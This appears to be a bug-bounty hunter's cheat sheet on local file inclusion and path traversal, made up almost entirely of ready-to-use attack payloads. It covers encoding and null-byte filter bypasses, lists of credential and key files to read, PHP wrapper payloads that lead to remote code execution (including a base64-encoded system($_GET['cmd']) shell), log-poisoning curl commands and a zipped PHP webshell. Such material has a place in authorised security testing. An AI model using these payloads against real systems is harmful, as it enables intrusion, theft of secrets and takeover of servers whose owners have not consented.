---
tags: [bugbounty, vuln/lfi, cheatsheet, p1, p2]
aliases: [Local File Inclusion, LFI, Path Traversal]
cssclasses: [bb-hunter]
updated: 2026-04-21
---

# LFI — Local File Inclusion / Path Traversal

> [!tldr] Hunter Summary
> **What:** Read arbitrary local files via unsanitized path input.
> **Impact:** /etc/passwd → user enum; /proc/self/environ → env vars / secrets; source code → further bugs; log poisoning → RCE.
> **Best targets:** `?file=`, `?page=`, `?template=`, `?lang=`, `?include=`, `?path=`
> **Time to triage:** 5 min. Try `../../../../etc/passwd`. Positive = escalate to log poison or env read.

---

## Where to Hunt

| Signal | Look for |
|--------|----------|
| File params | `?file=`, `?page=`, `?template=`, `?path=`, `?include=`, `?lang=`, `?view=` |
| Image/download | `?img=`, `?download=`, `?attachment=`, `?doc=` |
| Language/locale | `?lang=en`, `?locale=fr` |
| Logs/reports | `?log=`, `?report=`, `?export=` |
| Zip/archive | Upload a zip with path traversal filename inside |
| PHP apps | Any app with `include($file)`, `require($page)` pattern |

---

## Step-by-Step Hunt

### Step 1 — Detect with classic payload
```
# Linux targets
?file=../../../../etc/passwd
?page=../../../etc/passwd
?path=/etc/passwd

# Windows targets
?file=../../../../windows/win.ini
?file=../../../../boot.ini
?file=C:\windows\win.ini
?file=C:\windows\system32\drivers\etc\hosts
```

### Step 2 — Try filter bypasses
```
# Double encoding
../  =  %2e%2e%2f
%252e%252e%252f  (double URL encode)
..%2f  %2e%2e/

# URL encoding variations
..%252f..%252f..%252fetc%252fpasswd
%2e%2e%2fetc%2fpasswd

# Null byte (PHP < 5.3.4)
?file=../../../../etc/passwd%00
?file=../../../../etc/passwd%00.jpg

# Path with extra dots
?file=....//....//....//etc/passwd
?file=..././..././..././etc/passwd

# Absolute path bypass (if filter removes ../)
?file=/etc/passwd

# PHP wrapper bypass
?file=....//....//etc/passwd
?file=php://filter/read=convert.base64-encode/resource=index.php
```

### Step 3 — Read sensitive files
```
# User info
/etc/passwd
/etc/shadow  (if running as root)
/etc/hosts
/home/$user/.ssh/id_rsa
/home/$user/.bash_history
/root/.bash_history
/root/.ssh/id_rsa

# App secrets
/proc/self/environ   (environment variables — may have app secrets)
/proc/self/cmdline   (how app was started — flags/paths)
/proc/self/fd/0      (stdin)
/proc/self/maps      (memory maps)

# Web app source
/var/www/html/index.php
/var/www/html/config.php
/var/www/html/.env
/app/config/database.yml  (Rails)
/app/config/secrets.yml
/proc/self/root/etc/passwd  (container escape check)

# Server config
/etc/apache2/sites-enabled/000-default.conf
/etc/nginx/nginx.conf
/etc/nginx/sites-enabled/default
```

### Step 4 — PHP Wrapper techniques
```
# Read PHP source (base64 encoded)
?page=php://filter/read=convert.base64-encode/resource=config.php
# Decode the output: echo "BASE64" | base64 -d

# Remote code execution via expect wrapper
?page=expect://id

# data:// RCE (if allow_url_include=On)
?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=
# = <?php system($_GET['cmd']); ?>

# input:// — POST body as file (rare)
?page=php://input  +  POST body: <?php system('id'); ?>
```

### Step 5 — Log poisoning → RCE
```bash
# Step A: inject PHP into a log that the app reads
# Apache access log:
curl "https://target.com/<?php system(\$_GET['cmd']); ?>"
# The User-Agent:
curl -A "<?php system(\$_GET['cmd']); ?>" https://target.com/

# Nginx error log (/var/log/nginx/error.log)
# Auth log (/var/log/auth.log via SSH login with PHP payload as username)

# Step B: include the log file
?file=../../../../var/log/apache2/access.log&cmd=id
?file=../../../../var/log/nginx/access.log&cmd=whoami
?file=../../../../proc/self/fd/2&cmd=id  (stderr)
```

### Step 6 — ZIP file inclusion (PHP)
```
# Create a PHP webshell inside a zip file
echo '<?php system($_GET["cmd"]); ?>' > shell.php
zip shell.zip shell.php
# Upload the zip file
# Include via phar:// or zip://
?page=zip://uploads/shell.zip%23shell.php
?page=phar://uploads/shell.zip/shell.php
```

---

## Payload Quick Ref

```
# Basic traversal
../../../../etc/passwd
../../../etc/passwd
../../etc/passwd

# Encoded
%2e%2e/%2e%2e/%2e%2e/etc/passwd
..%252f..%252f..%252fetc%252fpasswd
....//....//....//etc/passwd

# PHP wrappers
php://filter/read=convert.base64-encode/resource=index.php
php://filter/convert.base64-encode/resource=config.php
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=
expect://id

# Null byte (PHP < 5.3.4)
../../../../etc/passwd%00
../../../../etc/passwd%00.jpg

# Windows
..\..\..\windows\win.ini
%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5cwin.ini
```

---

## 2025-2026 Updates

> [!info] New LFI surface (2025-2026)
> - **Container LFI:** `/proc/self/root/` traversal can escape some container setups; `/run/secrets/` in Docker Swarm contains mounted secrets
> - **Cloud function LFI:** Serverless functions — `/proc/self/environ` leaks cloud credentials (AWS_SECRET_ACCESS_KEY, etc.)
> - **`__proto__` in path:** Some Node.js path libraries vulnerable to prototype pollution that leads to path traversal
> - **ZIP slip in uploads:** Archive extraction without path sanitization — upload `../../shell.php` inside a tar/zip
> - **phar deserialization:** PHP phar:// wrapper triggers deserialization on file_exists(), rename(), etc.

---

## Chain Ideas

| LFI → | Result |
|-------|--------|
| /etc/passwd | → User enumeration → SSH brute |
| /proc/self/environ | → Secret keys / API tokens exfil |
| Source code read | → Find more vulnerabilities |
| Log poisoning | → RCE |
| phar:// upload | → Deserialization → RCE |
| .env file | → DB creds, API keys |

---

## Tools

| Tool | Use |
|------|-----|
| `ffuf` | Fuzz path traversal depths and encodings |
| `dotdotpwn` | Automated path traversal fuzzer |
| `lfimap` | Automated LFI exploitation (wrappers, log poison) |
| Burp Intruder | Payload list from SecLists `Fuzzing/LFI/` |

---

## References

- PortSwigger Path Traversal — https://portswigger.net/web-security/file-path-traversal
- PayloadsAllTheThings LFI — https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion
- SecLists LFI payloads — https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI
